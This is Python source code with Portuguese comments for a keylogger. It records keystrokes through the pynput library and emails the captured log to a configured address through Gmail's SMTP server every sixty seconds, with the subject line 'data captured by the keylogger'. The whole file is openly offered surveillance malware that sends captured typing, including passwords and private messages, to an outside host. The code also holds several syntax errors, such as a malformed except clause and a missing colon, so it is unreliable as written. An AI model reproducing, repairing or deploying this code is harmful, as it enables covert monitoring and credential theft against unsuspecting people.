from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

#Configurações de e-mail
EMAIL_ORIGEM = ""
EMAIL_DESTINO = ""
SENHA_EMAIL = "" #fornecido pelo servidor SMTP

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados pelo keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO
        
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar", e)
    
        log = ""
    
    #Tempo de envio em 60 segundos
    Timer(60, enviar_email).start()

# Verificação de Key press
def on_press(key):
    global log
    try:
        log += key.char
        
    except.AttributeError:
        #with open("log.txt"), "a", encoding = "utf-8") as f:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += "[<]"
        else
            pass
            
with keyboard.listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()